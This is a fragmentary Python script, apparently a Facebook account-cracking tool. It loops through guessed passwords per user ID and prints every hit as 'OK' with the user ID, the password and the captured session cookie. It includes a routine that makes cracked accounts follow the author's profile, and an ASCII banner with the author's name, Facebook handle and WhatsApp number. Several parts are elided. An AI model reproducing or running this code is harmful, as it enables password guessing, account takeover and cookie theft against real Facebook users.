...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=Shifat.Bondokshi', {
...
(  ____ \(  ____ \   (  ____ \|\     /|\__   __/(  ____ \(  ___  )\__   __/
| (    \/| (    \/   | (    \/| )   ( |   ) (   | (    \/| (   ) |   ) (   
...
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[AUTHOR:==========> \33[1;38mMrs. SHIFAT \33[1;38m                  ║\033[1;31m
\033[0;93m╠══[FACEBOOK:==========> \33[1;38mSHIFAT BONDOKSHI                  ║  
\033[0;93m╠══[WHATSAPP:==========> \33[1;38m+8801927755908             ║\33[1;35m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SHIFAT-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}\033[0;95m[{xr}SHIFAT{x}\033[0;95m][%s|%s][OK:{xr}%s{x}\033[0;95m]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
